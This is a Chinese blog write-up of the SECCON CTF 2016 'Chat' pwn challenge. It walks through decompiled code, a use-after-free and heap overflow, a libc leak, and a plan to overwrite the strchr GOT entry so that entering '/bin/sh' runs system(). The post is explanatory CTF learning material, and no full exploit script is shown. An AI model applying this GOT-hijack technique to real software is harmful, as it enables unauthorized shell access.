<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SECCON CTF 2016 Quals - Chat 分析与思考 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>SECCON CTF 2016 Quals - Chat 分析与思考</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-08-21T10:28:21.000Z" id="date"> 2021-08-21</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:35.008Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<p>         CTFSHOW吃瓜杯，PWN方向第三题竟是SECCON原题，于是当时没有仔细研究，直接套用了其他大佬的EXP(第二第三第四题都是各大比赛的原题，网上可以直接找到写好的EXP……)</p>
<p>        既然现在比赛结束了，正好来补一下WP。收获很大，说明我还非常菜…..</p>
<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><h2 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h2><p>        Main：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)<br>&#123;<br>  int v3; // eax<br>  int v4; // eax<br>  int v6; // [rsp+0h] [rbp-B0h]<br>  _QWORD *v7; // [rsp+8h] [rbp-A8h] BYREF<br>  char v8[136]; // [rsp+10h] [rbp-A0h] BYREF<br>  unsigned __int64 v9; // [rsp+98h] [rbp-18h]<br><br>  v9 = __readfsqword(0x28u);<br>  v7 = 0LL;<br>  fwrite(&quot;Simple Chat Service\n&quot;, 1uLL, 0x14uLL, stdout);<br>  do<br>  &#123;<br>    if ( v7 )<br>    &#123;<br>      service(v7);<br>      logout(&amp;v7);<br>    &#125;<br>    fwrite(&quot;\n1 : Sign Up\t2 : Sign In\n0 : Exit\nmenu &gt; &quot;, 1uLL, 0x29uLL, stdout);<br>    v3 = getint();<br>    v6 = v3;<br>    if ( v3 )<br>    &#123;<br>      if ( v3 &lt; 0  v3 &gt; 2 )<br>      &#123;<br>        fwrite(&quot;Wrong Input...\n&quot;, 1uLL, 0xFuLL, stderr);<br>      &#125;<br>      else<br>      &#123;<br>        fwrite(&quot;name &gt; &quot;, 1uLL, 7uLL, stdout);<br>        getnline(v8, 32LL);<br>        if ( v6 == 1 )<br>          v4 = signup(v8);<br>        else<br>          v4 = login(&amp;v7, v8);<br>        if ( v4 == 1 )<br>          fwrite(&quot;Success!\n&quot;, 1uLL, 9uLL, stdout);<br>        else<br>          fwrite(&quot;Failure...\n&quot;, 1uLL, 0xBuLL, stderr);<br>      &#125;<br>    &#125;<br>  &#125;<br>  while ( v6 );<br>  return fwrite(&quot;Thank you for using Simple Chat Service!\n&quot;, 1uLL, 0x29uLL, stdout);<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/a6b8f856-07dc-4180-b77f-6d469ba2c87f'><img src="blob:https://tokameine.top/a6b8f856-07dc-4180-b77f-6d469ba2c87f"></p>
<p>        Service： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsigned __int64 __fastcall service(_QWORD *a1)<br>&#123;<br>  unsigned int v1; // eax<br>  int v2; // eax<br>  int v4; // [rsp+14h] [rbp-9Ch]<br>  __int64 v5; // [rsp+18h] [rbp-98h]<br>  char v6[136]; // [rsp+20h] [rbp-90h] BYREF<br>  unsigned __int64 v7; // [rsp+A8h] [rbp-8h]<br><br>  v7 = __readfsqword(0x28u);<br>  fwrite(&quot;\nService Menu\n&quot;, 1uLL, 0xEuLL, stdout);<br>  do<br>  &#123;<br>    fwrite(<br>      &quot;\n&quot;<br>      &quot;1 : Show TimeLine\t2 : Show DM\t3 : Show UsersList\n&quot;<br>      &quot;4 : Send PublicMessage\t5 : Send DirectMessage\n&quot;<br>      &quot;6 : Remove PublicMessage\t\t7 : Change UserName\n&quot;<br>      &quot;0 : Sign Out\n&quot;<br>      &quot;menu &gt;&gt; &quot;,<br>      1uLL,<br>      0xA3uLL,<br>      stdout);<br>    v4 = getint();<br>    switch ( v4 )<br>    &#123;<br>      case 0:<br>        break;<br>      case 1:<br>        get_tweet(0LL);<br>        break;<br>      case 2:<br>        get_tweet(a1);<br>        break;<br>      case 3:<br>        list_users();<br>        break;<br>      case 4:<br>        fwrite(&quot;message &gt;&gt; &quot;, 1uLL, 0xBuLL, stdout);<br>        getnline(v6, 0x80LL);<br>        post_tweet(a1, 0LL, v6);<br>        break;<br>      case 5:<br>        fwrite(&quot;name &gt;&gt; &quot;, 1uLL, 8uLL, stdout);<br>        getnline(v6, 32LL);<br>        v5 = get_user(v6);<br>        if ( v5 )<br>        &#123;<br>          fwrite(&quot;message &gt;&gt; &quot;, 1uLL, 0xBuLL, stdout);<br>          getnline(v6, 128LL);<br>          post_tweet(a1, v5, v6);<br>        &#125;<br>        else<br>        &#123;<br>          fprintf(stderr, &quot;User &#x27;%s&#x27; does not exist.\n&quot;, v6);<br>        &#125;<br>        break;<br>      case 6:<br>        fwrite(&quot;id &gt;&gt; &quot;, 1uLL, 6uLL, stdout);<br>        v1 = getint();<br>        v2 = remove_tweet(a1, v1);<br>        if ( v2 == -1 )<br>        &#123;<br>          fwrite(&quot;Can not remove other user&#x27;s message.\n&quot;, 1uLL, 0x25uLL, stderr);<br>        &#125;<br>        else if ( !v2 )<br>        &#123;<br>          fwrite(&quot;Message not found.\n&quot;, 1uLL, 0x13uLL, stderr);<br>        &#125;<br>        break;<br>      case 7:<br>        fwrite(&quot;name &gt;&gt; &quot;, 1uLL, 8uLL, stdout);<br>        getnline(v6, 32LL);<br>        if ( change_name(a1, v6) &lt; 0 )<br>          v4 = 0;<br>        break;<br>      default:<br>        fwrite(&quot;Wrong Input...\n&quot;, 1uLL, 0xFuLL, stderr);<br>        break;<br>    &#125;<br>    if ( v4 )<br>      fwrite(&quot;Done.\n&quot;, 1uLL, 6uLL, stdout);<br>  &#125;<br>  while ( v4 );<br>  return __readfsqword(0x28u) ^ v7;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/f52c4b01-52d4-418c-8427-a74a6b37b907'><img src="blob:https://tokameine.top/f52c4b01-52d4-418c-8427-a74a6b37b907"></p>
<p>        程序大致实现了一个聊天室功能，能够注册、公共频道发消息、私信等等。</p>
<p>        审计代码时务必要捋清每个变量的意义，否则会因为大量的指针而失去方向。</p>
<p>         如下结构体为程序所用到的两个结构，整个程序从头到尾都只会对这两个结构进行操作，当然，要得出这样的结构体需要经过仔细的审计，其过程本文不再赘述，仅提供结果以方便之后的理解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct user &#123;<br>    char *name;<br>    struct message *msg;<br>    struct user *next_user;<br>&#125;<br><br>struct message &#123;<br>    int id ; // use in tweet (public message) only<br>    struct user *sender;<br>    char content[128];<br>    struct message *next_msg;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/4bb61f18-7955-4843-a688-2163069cd7d7'><img src="blob:https://tokameine.top/4bb61f18-7955-4843-a688-2163069cd7d7"></p>
<h2 id="漏洞分析与利用："><a href="#漏洞分析与利用：" class="headerlink" title="漏洞分析与利用："></a>漏洞分析与利用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall change_name(_QWORD *a1, const char *a2)<br>&#123;<br>......<br>  else<br>  &#123;<br>    fwrite(&quot;Change name error...\n&quot;, 1uLL, 0x15uLL, stderr);<br>    remove_user(a1);<br>    result = 0xFFFFFFFFLL;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/34bb13d1-5230-4737-835a-f64a415ce66d'><img src="blob:https://tokameine.top/34bb13d1-5230-4737-835a-f64a415ce66d"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void __fastcall remove_user(__int64 a1)<br>&#123;<br>  __int64 i; // [rsp+18h] [rbp-18h]<br>  _QWORD *ptr; // [rsp+20h] [rbp-10h]<br>  _QWORD *v3; // [rsp+28h] [rbp-8h]<br>  _QWORD *v4; // [rsp+28h] [rbp-8h]<br>  void *v5; // [rsp+28h] [rbp-8h]<br><br>  for ( ptr = *(a1 + 8); ptr; ptr = v3 )<br>  &#123;<br>    v3 = ptr[18];<br>    free(ptr);<br>  &#125;<br>  for ( i = tl; i; i = *(i + 144) )<br>  &#123;<br>    if ( *(i + 0x90) &amp;&amp; *(*(i + 144) + 8LL) == a1 )<br>    &#123;<br>      v4 = *(i + 144);<br>      *(i + 144) = v4[18];<br>      free(v4);<br>    &#125;<br>  &#125;<br>  if ( tl &amp;&amp; *(tl + 8) == a1 )<br>  &#123;<br>    v5 = tl;<br>    tl = *(tl + 144);<br>    free(v5);<br>  &#125;<br>  free(*a1);<br>  free(a1);<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/5e142556-d638-40d7-b858-e067b3df223d'><img src="blob:https://tokameine.top/5e142556-d638-40d7-b858-e067b3df223d"></p>
<p>        remove_user函数在程序中异常的扎眼。当用户尝试修改用户名时将进行检测，如果用户名的首字母是不可打印字符，就会直接将这个用户删除。但在remove_user中可以看见，并没有对free后的指针进行置NULL，看起来像是UAF，但该漏洞并不体现在free上，而是在该函数的逻辑上</p>
<p>        该函数将按如下顺序释放内存块：</p>
<ol>
<li>将发送给该目标的私信message 释放</li>
<li>将该用户发送到公频的message 释放</li>
<li>将该用户的name 释放</li>
<li>将该用户本身释放</li>
</ol>
<p>        但是，它并没有将该用户发送给其他用户的私信message释放，那么在其他用户看来，当该用户被删除之后，私信会变成什么样？如下过程进行了测试，笔者以F2按键按下的内容作为用户“aa”的新名字让其被删除，再显示用户“bb”收到的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Simple Chat Service<br><br>1 : Sign Up2 : Sign In<br>0 : Exit<br>menu &gt; 1<br>name &gt; aa<br>Success!<br><br>1 : Sign Up2 : Sign In<br>0 : Exit<br>menu &gt; 1<br>name &gt; bb<br>Success!<br><br>1 : Sign Up2 : Sign In<br>0 : Exit<br>menu &gt; 2<br>name &gt; aa<br>Hello, aa!<br>Success!<br><br>Service Menu<br><br>1 : Show TimeLine2 : Show DM3 : Show UsersList<br>4 : Send PublicMessage5 : Send DirectMessage<br>6 : Remove PublicMessage7 : Change UserName<br>0 : Sign Out<br>menu &gt;&gt; 5<br>name &gt;&gt; bb<br>message &gt;&gt; from a<br>Done.<br><br>1 : Show TimeLine2 : Show DM3 : Show UsersList<br>4 : Send PublicMessage5 : Send DirectMessage<br>6 : Remove PublicMessage7 : Change UserName<br>0 : Sign Out<br>menu &gt;&gt; 7<br>name &gt;&gt; ^[OQ<br>Change name error...<br>Bye, <br><br>1 : Sign Up2 : Sign In<br>0 : Exit<br>menu &gt; 2<br>name &gt; bb<br>Hello, bb!<br>Success!<br><br>Service Menu<br><br>1 : Show TimeLine2 : Show DM3 : Show UsersList<br>4 : Send PublicMessage5 : Send DirectMessage<br>6 : Remove PublicMessage7 : Change UserName<br>0 : Sign Out<br>menu &gt;&gt; 2<br>Direct Messages<br>[] from a<br>Done.<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/b2f3b40d-4338-4c00-bfac-5595f081c0dd'><img src="blob:https://tokameine.top/b2f3b40d-4338-4c00-bfac-5595f081c0dd"></p>
<p>        收到私信显示的名字出现了异常，但消息仍然能被显示出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall get_tweet(__int64 a1)<br>&#123;<br>  const char *v1; // rax<br>  __int64 v2; // rax<br>  unsigned int v4; // [rsp+1Ch] [rbp-14h]<br>  unsigned int *v5; // [rsp+20h] [rbp-10h]<br>  char *format; // [rsp+28h] [rbp-8h]<br><br>  if ( a1 )<br>    fprintf(stdout, &quot;Direct Messages\n&quot;);<br>  else<br>    fprintf(stdout, &quot;Time Line\n&quot;);<br>  if ( a1 )<br>    v1 = &quot;[%s] %s\n&quot;;<br>  else<br>    v1 = &quot;(%3$03d)[%s] %s\n&quot;;<br>  format = v1;<br>  v4 = 0;<br>  if ( a1 )<br>    v2 = *(a1 + 8);<br>  else<br>    v2 = tl;<br>  v5 = v2;<br>  while ( v5 )<br>  &#123;<br>    fprintf(stdout, format, **(v5 + 1), v5 + 4, *v5);<br>    v5 = *(v5 + 18);<br>    ++v4;<br>  &#125;<br>  return v4;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/04d5a67c-bfe6-4fda-ac3b-f13890cd7844'><img src="blob:https://tokameine.top/04d5a67c-bfe6-4fda-ac3b-f13890cd7844"></p>
<p>        显示规则如上，此处的变量 a1 为指向当前登录用户结构体的指针</p>
<p>        输出的名字为 <strong>**(v5 + 1)</strong> </p>
<p>        既然该消息没有被释放，那么此处构成**UAF(Use After Free)**，只要能够操作 <strong>*(v5+1)</strong> 的内容，就能泄露任意地址的内容</p>
<p>        <strong>*(v5+1)</strong> 为一个指向 name 的指针，在创建账号的时候会开辟一个user，然后再开辟一个name：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall signup(const char *a1)<br>&#123;<br>  __int64 result; // rax<br>  int v2; // [rsp+14h] [rbp-Ch]<br>  _QWORD *ptr; // [rsp+18h] [rbp-8h]<br><br>  if ( get_user(a1) )<br>  &#123;<br>    fprintf(stderr, &quot;User &#x27;%s&#x27; already exists\n&quot;, a1);<br>    result = 0LL;<br>  &#125;<br>  else<br>  &#123;<br>    ptr = malloc(0x18uLL);<br>    v2 = hash(a1);<br>    if ( v2 &gt;= 0 )<br>    &#123;<br>      *ptr = strdup(a1);<br>      ptr[1] = 0LL;<br>      ptr[2] = user_tbl[v2];<br>      user_tbl[v2] = ptr;<br>      result = 1LL;<br>    &#125;<br>    else<br>    &#123;<br>      free(ptr);<br>      fwrite(&quot;Signup failed...\n&quot;, 1uLL, 0x11uLL, stderr);<br>      result = 0xFFFFFFFFLL;<br>    &#125;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/167967ea-9455-4ac0-a5ec-e351e51640c1'><img src="blob:https://tokameine.top/167967ea-9455-4ac0-a5ec-e351e51640c1"></p>
<p>        特别的是，name通过strdup开辟(该函数会为字符串自动开辟合适大小空间然后进行拷贝)</p>
<p>        如果名字只有16个字符之内，strdup只开辟0x20大小空间，但名字能有32个字符，如果使用名字长达30，该函数就会开辟0x30大小的字符</p>
<p>        但如果其开辟了0x20，而用户通过改名来改为更长的字符就能实现堆溢出(0x20中只有0x10用于储存字符，而0x30中则有0x20储存内容)</p>
<p>        堆溢出在此处可以用于<strong>复写下一个chunk的size，构成heap overflow</strong></p>
<p>        以及，在注销用户时也会按顺序先释放name再释放user，申请的时候会先申请user再申请name，我们的目的是让某个被注销的name重新被申请为某个user，这样在get_tweet时候得到的name指针即为新用户的name字段内容，该字段能通过change_name任意写地址</p>
<p>        至此，利用UAF泄露libc基址</p>
<p>        接下来是如何让程序执行 system(“&#x2F;bin&#x2F;sh”)</p>
<p>        基本思路是通过复写某个函数，让程序在调用时执行system</p>
<p>        其中目的函数为 strchr，原因如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int getint()<br>&#123;<br>  int result; // eax<br>  char nptr[136]; // [rsp+0h] [rbp-A0h] BYREF<br>  unsigned __int64 v2; // [rsp+88h] [rbp-18h]<br><br>  v2 = __readfsqword(0x28u);<br>  memset(nptr, 0, 0x80uLL);<br>  if ( getnline(nptr, 128LL) )<br>    result = atoi(nptr);<br>  else<br>    result = 0;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/b53df011-8425-4fa2-8adc-8390562786e2'><img src="blob:https://tokameine.top/b53df011-8425-4fa2-8adc-8390562786e2"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">size_t __fastcall getnline(char *a1, int a2)<br>&#123;<br>  char *v3; // [rsp+18h] [rbp-8h]<br><br>  fgets(a1, a2, stdin);<br>  v3 = strchr(a1, 10);<br>  if ( v3 )<br>    *v3 = 0;<br>  return strlen(a1);<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/874fd964-b536-4ab9-906b-2dbe3183b9e5'><img src="blob:https://tokameine.top/874fd964-b536-4ab9-906b-2dbe3183b9e5"></p>
<p>        main函数中通过getint函数来获取参数，倘若输入“&#x2F;bin&#x2F;sh”，则在getnline中执行  
 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">        strchr(&quot;/bin/sh&quot;，10)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/3bdb4eb0-5161-4cfb-b699-8624ddd1cfa2'><img src="blob:https://tokameine.top/3bdb4eb0-5161-4cfb-b699-8624ddd1cfa2"></p>
<p>         替换之后就会变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">        system(&quot;/bin/sh&quot;)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/7824c3d7-8819-4eb1-9801-659f066d77ed'><img src="blob:https://tokameine.top/7824c3d7-8819-4eb1-9801-659f066d77ed"></p>
<p>        不过有些需要注意：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.got.plt:0000000000603018 off_603018      dq offset free          ; DATA XREF: _free↑r<br>.got.plt:0000000000603020 off_603020      dq offset strlen        ; DATA XREF: _strlen↑r<br>.got.plt:0000000000603028 off_603028      dq offset __stack_chk_fail<br>.got.plt:0000000000603028                                         ; DATA XREF: ___stack_chk_fail↑r<br>.got.plt:0000000000603030 off_603030      dq offset setbuf        ; DATA XREF: _setbuf↑r<br>.got.plt:0000000000603038 off_603038      dq offset strchr        ; DATA XREF: _strchr↑r<br>.got.plt:0000000000603040 off_603040      dq offset __libc_start_main<br>.got.plt:0000000000603040                                         ; DATA XREF: ___libc_start_main↑r<br>.got.plt:0000000000603048 off_603048      dq offset fgets         ; DATA XREF: _fgets↑r<br>.got.plt:0000000000603050 off_603050      dq offset strcmp        ; DATA XREF: _strcmp↑r<br>.got.plt:0000000000603058 off_603058      dq offset fprintf       ; DATA XREF: _fprintf↑r<br>.got.plt:0000000000603060 off_603060      dq offset __gmon_start__<br>.got.plt:0000000000603060                                         ; DATA XREF: ___gmon_start__↑r<br>.got.plt:0000000000603068 off_603068      dq offset tolower       ; DATA XREF: _tolower↑r<br>.got.plt:0000000000603070 off_603070      dq offset malloc        ; DATA XREF: _malloc↑r<br>.got.plt:0000000000603078 off_603078      dq offset isprint       ; DATA XREF: _isprint↑r<br>.got.plt:0000000000603080 off_603080      dq offset atoi          ; DATA XREF: _atoi↑r<br>.got.plt:0000000000603088 off_603088      dq offset fwrite        ; DATA XREF: _fwrite↑r<br>.got.plt:0000000000603090 off_603090      dq offset strdup        